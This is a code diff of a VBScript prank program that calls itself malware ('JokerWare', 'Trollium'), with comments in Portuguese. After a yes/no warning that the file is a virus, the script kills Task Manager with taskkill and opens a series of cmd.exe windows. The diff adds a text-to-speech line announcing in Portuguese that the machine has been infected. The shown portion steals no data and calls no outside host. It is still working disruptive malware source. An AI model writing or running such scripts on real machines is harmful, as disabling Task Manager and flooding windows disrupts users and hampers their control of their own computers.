@@ -1,9 +1,11 @@
 'Eu sei q o loop ta mal feito, mas ta feito pra ir executando tudo de vez e não ficar demorando q nem o loop normal
-
+dim sapi
+Set sapi =CreateObject("sapi.spvoice")
 Set WshShell = wscript.createobject("wscript.shell")
 Dim opcao
 opcao = msgbox ("The file you want to run is a VIRUS (MALWARE) and can damage your RAM or any other part of your computer! I am not responsible for your actions, do you really want to run this file?",VbYesNo)
 If opcao = VbYes Then
+sapi.Speak "a sua maquina foi infectada pelo Trollium. Aproveite sua experiência com o meu JokerWare"
 WshShell.Run "taskkill /im taskmgr.exe", , True
 WshShell.run "cmd.exe"
 WshShell.run "cmd.exe"
